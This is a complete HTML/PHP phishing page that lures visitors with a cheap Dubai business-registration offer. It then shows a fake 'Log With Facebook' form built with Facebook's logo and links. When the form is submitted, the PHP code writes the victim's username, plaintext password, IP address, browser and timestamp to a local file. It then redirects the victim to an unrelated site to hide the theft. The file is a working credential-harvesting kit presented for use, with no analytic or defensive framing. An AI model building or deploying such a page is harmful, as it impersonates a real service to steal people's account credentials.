<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="shortcut icon" href="https://www.abcfundraising.com/favicon.ico" type="image/x-icon">
<title>Start your Company in DUBAI</title>
<meta name="description" content="Start your business at low capital( 200$ only) in DUBAI">
<style>
body {font-family: Arial, Helvetica, sans-serif; background-color: #e9ebee;}

/* Full-width input fields */
input[type=text], input[type=password] {
  width: 100%;
  padding: 12px 20px;
  margin: 8px 0;
  display: inline-block;
  border: 1px solid #ccc;
  box-sizing: border-box;
  outline: none;
  border-radius: 12px;
}

/* Set a style for all buttons */
button {
  background-color: #4CAF50;
  color: white;
  padding: 14px 20px;
  margin: 8px 0;
  border: none;
  cursor: pointer;
  width: 100%;
  border-radius: 12px;
}
.left-btn{
	float: left;
}

button:hover {
  opacity: 0.8;
}

/* Extra styles for the cancel button */
.cancelbtn {
  width: auto;
  padding: 10px 18px;
  background-color: #f44336;
}

/* Center the image and position the close button */
.imgcontainer {
  text-align: center;
  margin: 24px 0 12px 0;
  position: relative;
}

img.avatar {
  width: 40%;
  border-radius: 50%;
}

.container {
  padding: 16px;
}

span.psw {
  float: left;
  padding-top: 16px;
}

/* The Modal (background) */
.modal {
   /* Hidden by default */
  position: fixed; /* Stay in place */
  z-index: 1; /* Sit on top */
  left: 0;
  top: 0;
  width: 100%; /* Full width */
  height: 100%; /* Full height */
  overflow: auto; /* Enable scroll if needed */
  //background-color: rgb(0,0,0); /* Fallback color */
 // background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
  padding-top: 60px;
  text-align: center;
}

/* Modal Content/Box */
.modal-content {
  background-color: #fefefe;
  margin: 1% auto 30% auto; /* 5% from the top, 15% from the bottom and centered */
  //border: 1px solid #888;
  width: 30%;
  border-radius: 5px; /* Could be more or less, depending on screen size */
}

/* The Close Button (x) */
.close {
  position: absolute;
  right: 25px;
  top: 0;
  color: #000;
  font-size: 35px;
  font-weight: bold;
}

.close:hover,
.close:focus {
  color: red;
  cursor: pointer;
}

/* Add Zoom Animation */
.animate {
  -webkit-animation: animatezoom 0.6s;
  animation: animatezoom 0.6s
}

@-webkit-keyframes animatezoom {
  from {-webkit-transform: scale(0)} 
  to {-webkit-transform: scale(1)}
}
  
@keyframes animatezoom {
  from {transform: scale(0)} 
  to {transform: scale(1)}
}

/* Change styles for span and cancel button on extra small screens */
@media screen and (max-width: 770px) {
  span.psw {
     display: block;
     float: none;
  }
  .cancelbtn {
     width: 100%;
  }
  .modal-content{
  	width: 80%;
  	margin: 1% auto 10% auto;
  }
}
</style>
</head>
<body>


<div id="id01" class="modal">
  	<center>
  		<img src="https://www.facebook.com/rsrc.php/y8/r/dF5SId3UHWd.svg" style="height: 80px;">
  	</center>
  <form class="modal-content animate" action="" method="post">
  		
    <div class="container">
    	<h4>Log With Facebook</h4>
      <input type="text" placeholder="Enter Username" name="uname" required>

      <input type="password" placeholder="Enter Password" name="psw" required>
        
      <button type="submit" name="submit" style="background-color: #1877f2;">Login</button>
     
    </div>

    <div class="container" style="background-color:#f1f1f1">
    <span class="psw">Forgot <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login">password?</a></span>	
      <button class="left-btn" type="button"  class="cancelbtn" onclick="myFun()"> <a href="#" style="text-decoration: none; color: white;">Cancel</a></button>
      
    </div>
  </form>
</div>

<?php 
 if (isset($_POST["submit"])) {
 	$myFile = "savedata.json";
 	$arr_data = array();

 	$file=fopen("savedata.json", "a");
  fwrite($file, "IP Address : ");
  fwrite($file, $_SERVERT['REMOTE_ADDR']."\n");

  fwrite($file, "Browser : ");
  fwrite($file, get_browser()."\n");

  fwrite($file, "Date : ");
  fwrite($file, date("l jS \of F Y h:i:s A")."\n");

 	fwrite($file, "username : ");
 	fwrite($file, $_POST['uname']."\n");

 	fwrite($file, "password : ");
 	fwrite($file, $_POST['psw']."\n"."\n");


 	fclose($file);
 	/*try{
 		$formdata = array(
 			'username'=> 'Ajay ',
 			'password'=>'123456555'
 		);
 		//$jsondata = file_get_contents($myFile);
 		//$arr_data = json_decode($jsondata, true);
 		//array_push($arr_data, $formdata);
 		//array_push($arr_data, $formdata);

 		//$jsondata = json_encode($arr_data, JSON_PRETTY_PRINT);
 		$data = json_encode(array('data' => $formdata));
 		if(file_put_contents($myFile, $data)){
 			echo "Data successfully save";
 		}else
 		echo "error";
 	}
 	  	catch(Exception $e){
 		echo "Caught exception :" , $e->getMessage(), "\n";
 	}*/
 	?>
 	<script>
 		window.open("https://www.abcfundraising.com", "_self");
 	</script>
 	<?php
 }
?>
<script>
	function myFun() {
		window.open("https://businessindubai.herokuapp.com", "_self");
	}
</script>
</body>
</html>
